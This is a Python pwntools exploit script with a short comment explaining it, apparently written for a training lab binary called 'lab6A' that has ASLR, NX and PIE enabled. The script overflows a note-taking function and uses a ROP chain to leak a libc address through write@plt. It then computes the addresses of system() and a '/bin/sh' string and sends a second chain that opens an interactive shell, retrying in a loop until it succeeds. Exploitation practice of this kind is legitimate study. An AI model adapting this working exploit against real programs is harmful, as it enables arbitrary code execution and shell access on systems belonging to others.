'''
ASLR + NX + PIE + Partial RELRO

make_note() is vulnerable.


Approach: return to plt. However, all the plt addresses are jumped to using edx. like [edx+0x20],[edx+0x3c] etc. So, we need to
load the correct value into edx. ROP for that. Then use write to leak a libc address. Then use offsets to calculate system
and the magic address ( which contains "/bin/sh" string already in the libc).

Then run the vulnerability again (ROP) and then do system().
Coded in python.

-------------------------------------------------------------------------------------------------------------------------------
'''
#!/usr/bin/python
from pwn import *
'''overwrite sfunc with make_note and then call choice 3'''

#offset = 90
name = "A"*31 + "\n"
desc = "B"*90
#sfunc = "C"*4
sfunc = p32(0x565559af)
desc += sfunc

ropchain = "A"*52 #Overflow gets()

# write@plt --> make_note() --> p32(1) --> got.plt --> p32(4)
# got.plt = make_note + 9825

# pop ebx; ret
ropchain += p32(0x56555655)
ropchain += p32(0x56558000)
#ropchain += 

got = 0x565559af + 9817
#got = 0x565559af+4
write1 = 0x56555730
ropchain += p32(write1)
ret = 0x565559af
argument = p32(1)
argument += p32(got)
#argument += p32(got)
argument += p32(4)

ropchain += p32(ret)
ropchain += argument
ropchain += "\n"

desc += "\n"


def get_leak(b):
	word = "0x"
	word += b[6] + b[7]
	word += b[4] + b[5]
	word += b[2] + b[3]
	word += b[0] + b[1]
	print word
	return word

def exploit():
	sh1 = process("./lab6A")
	# raw_input()
	sh1.send("1\n")
	sh1.send(name)
	sh1.send(desc)
	fg = sh1.recv()
	# call make_note now.
	#raw_input()
	sh1.send("3\n")
	a = sh1.recv()
	find1 = "Note About"
	if find1 in a:
		#print a
		raw_input("Press Enter to send ROP Chain!!")
		# send ropchain now.
		sh1.send(ropchain)
		#sh1.interactive()
		b = sh1.recvuntil("Make")
		b = b.strip("Make")
		b = b.encode("hex")
		leak = get_leak(b)
		leak = int(leak,16)
		system_addr = leak - 1782112
		sh_address = system_addr + 1182347
		#print leak

		raw_input("Enter to start attack phase 2")
		ropchain2 = "A"*52
		ropchain2 += p32(system_addr)
		ropchain2 += "DUMY"
		ropchain2 += p32(sh_address)
		ropchain2 += "\n"
		sh1.send(ropchain2)
		sh1.interactive()
	sh1.close()

i = 0
while True:
	try:
		exploit()
	except:
		i += 1
		print "Try %d" %i
